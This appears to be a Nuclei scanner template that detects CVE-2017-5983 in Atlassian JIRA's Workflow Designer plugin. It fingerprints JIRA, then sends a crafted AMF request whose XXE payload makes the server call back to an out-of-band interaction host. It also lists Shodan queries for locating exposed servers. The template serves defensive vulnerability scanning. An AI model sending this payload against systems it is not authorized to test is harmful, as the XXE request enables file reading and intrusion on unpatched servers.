flow: http(1) && http(2)
http:
- host-redirects: true
  matchers:
  - internal: true
    part: body
    type: word
    words:
    - title="JiraVersion"
  method: GET
  path:
  - '{{BaseURL}}/secure/Dashboard.jspa'
  - '{{BaseURL}}/jira/secure/Dashboard.jspa'
  - '{{BaseURL}}/login.jsp'
  stop-at-first-match: true
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  raw:
  - 'POST /plugins/servlet/jwd/amf/ HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/xml

    Content-Length: {{len(xxe_payload)+29}}


    {{version}}{{header_count}}{{message_count}}{{target_uri_len}}{{target_uri}}{{response_uri_len}}{{response_uri}}{{url_decode(concat("%00%00%00%",dec_to_hex(len(concat(int,xml_marker,xxe_payload)))))}}{{xml_marker}}{{url_decode(concat("%00%00%00%",dec_to_hex(len(concat(xxe_payload)))))}}{{xxe_payload}}

    '
  unsafe: true
id: CVE-2017-5983
info:
  author: us3r777,Synacktiv
  classification:
    cpe: cpe:2.3:a:atlassian:jira:4.2.4:*:*:*:*:*:*:*
    cve-id: CVE-2017-5983
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-502
    epss-percentile: 0.91997
    epss-score: 0.08385
  description: 'The JIRA Workflow Designer Plugin in Atlassian JIRA Server before
    6.3.0 improperly uses an XML parser and deserializer, which allows remote attackers
    to execute arbitrary code, read arbitrary files, or cause a denial of service
    via a crafted serialized Java object.

    '
  impact: 'Unauthenticated attackers can execute arbitrary code on the server, read
    arbitrary files, or cause denial of service, potentially leading to complete server
    compromise.

    '
  metadata:
    max-request: 1
    product: jira
    shodan-query:
    - http.title:"system dashboard - jira"
    - cpe:"cpe:2.3:a:atlassian:jira"
    - http.component:"atlassian confluence"
    - http.component:"atlassian jira"
    vendor: atlassian
    verified: true
  name: JIRA Workflow Designer Plugin in Atlassian JIRA Server > 6.3.0 - Remote Code
    Execution (XXE)
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2017-5983
  - https://code-white.com/blog/2017-04-amf/
  remediation: 'Upgrade to JIRA Server version 6.3.0 or later.

    '
  severity: critical
  tags: cve,cve2017,jira,amf,rce,xxe,vuln
variables:
  header_count: "\0\0"
  int: '0000'
  message_count: "\0\x01"
  response_uri: test
  response_uri_len: "\0\x04"
  target_uri: test
  target_uri_len: "\0\x04"
  version: "\0\0"
  xml_marker: "\x0F"
  xxe_payload: <?xml version="1.0" ?> <!DOCTYPE message [ <!ENTITY % ext SYSTEM "http://{{interactsh-url}}/amf">
    %ext; ]>
